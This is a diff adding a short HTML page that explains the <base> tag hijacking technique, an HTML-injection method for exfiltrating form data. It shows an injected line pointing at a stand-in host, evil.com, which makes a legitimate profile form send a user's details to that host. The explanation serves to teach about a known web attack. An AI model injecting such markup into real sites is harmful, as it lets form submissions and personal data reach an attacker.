@@ -1,0 +1,16 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Base Tag Hijack</title>
+</head><body>The next exfiltration vector worth highlighting relies on the injection of &lt;base&gt; tags. A majority of web browsers honor this tag outside the standards-mandated &lt;head&gt; section; in such a case, the attacker injecting this markup would be able to change the semantics of all subsequently appearing relative URLs, e.g.:<br/>
+<br/>
+&lt;base href='http://evil.com/'&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;← Injected line<br/>
+...<br/>
+&lt;form action='update_profile.php'&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;← Legitimate, pre-existing form<br/>
+...<br/>
+&lt;input type="text" name="real_name" value="John Q. Public"&gt;<br/>
+...<br/>
+&lt;/form&gt;<br/>
+<br/>
+Here, any user-initiated profile update will be submitted to http://evil.com/update_profile.php, rather than back to the originating server that produced the HTML document.</body></html>
